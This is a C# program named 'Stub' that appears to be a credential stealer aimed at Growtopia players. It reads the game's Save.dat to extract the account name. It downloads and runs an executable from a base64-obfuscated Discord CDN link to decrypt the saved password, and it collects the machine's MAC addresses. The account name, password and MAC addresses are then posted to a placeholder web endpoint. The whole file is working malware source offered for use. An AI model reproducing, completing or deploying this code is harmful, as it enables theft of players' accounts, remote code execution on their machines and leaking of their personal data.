using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows;
using System.Net;
using System.Windows.Forms;
using System.Collections.Specialized;
using System.Net.NetworkInformation;
using System.Text.RegularExpressions;

namespace Stub
{
    internal class Program
    {
        public static string GetMacAddress()
        {
            string macAddresses1 = "";
            foreach (NetworkInterface nic in NetworkInterface.GetAllNetworkInterfaces())
            {
                macAddresses1 += "\n";
                macAddresses1 += nic.GetPhysicalAddress().ToString();
            }
            return macAddresses1;
        }
        public static string decodebase(string basedata)
        {
            byte[] bytes = Convert.FromBase64String(basedata);
            return Encoding.UTF8.GetString(bytes);
        }

        public static string getpass()
        {
            try
            {
                string nanananaan = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\Save.dat";
                if (File.Exists(nanananaan))
                {
                    new WebClient().DownloadFile(decodebase("aHR0cHM6Ly9jZG4uZGlzY29yZGFwcC5jb20vYXR0YWNobWVudHMvODgzMzUwODA1MjIxMDg1MTg1Lzg4MzM4NzQ4ODY4MzU1Njk0NC9zYXZlZGVjcnlwdGVyLmV4ZQ == "), Path.GetTempPath() + "\\Lanx1337.exe");
                    Process.Start(Path.GetTempPath() + "\\Lanx1337.exe");
                    Thread.Sleep(1000);
                    byte[] lolxd = File.ReadAllBytes(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\lanx.txt");
                    string result = System.Text.Encoding.UTF8.GetString(lolxd);
                    return result;
                }
                else
                {
                    string sorry = "couldnt find save.dat file!";
                    return sorry;
                }
            }
            catch (Exception)
            {
                string sorry1 = "an error has occured while decoding";
                return sorry1;
            }
        }
        public static string getuser()
        {
            try
            {
                string savedat = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Growtopia\\Save.dat";
                var pattern = new Regex(@"[^\w0 - 9]");
                string savedata = null;
                var r = File.Open(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
                using (FileStream fileStream = new FileStream(savedat, FileMode.Open, FileAccess.Read, FileShare.ReadWrite))
                {
                    using (StreamReader streamReader = new StreamReader(fileStream, Encoding.Default))
                    {
                        savedata = streamReader.ReadToEnd();
                    }
                }
                string cleardata = savedata.Replace("\u0000", " ");
                string firstgrowid = pattern.Replace(cleardata.Substring(cleardata.IndexOf("tankid_name") + "tankid_name".Length).Split(' ')[3], string.Empty);
                return firstgrowid;
            }
            catch (Exception)
            {
                string sorry2 = "couldnt find the username!";
                return sorry2;
            }
        }
        static void Main(string[] args)
        {

            using (WebClient client = new WebClient())
            {
                client.Headers.Add("Content-Type", "application/x-www-form-urlencoded");

                NameValueCollection data = new NameValueCollection()
                        {
                            { "protocol", "ssj2"},
                            { "Content",  string.Concat(new string[]
                            {
                                
                                "GrowID: ```\n" + getuser() + "```",
                                "\n",
                                "Password: ```\n" + getpass() + "```",
                                "\n",
                                "MAC:" + "```\n" + GetMacAddress() + "```",
                            })
                            
                            
                            }
                            

                        };

                    client.UploadValues("urwebsite/index.php", data);
                }
          

        }
    }
}
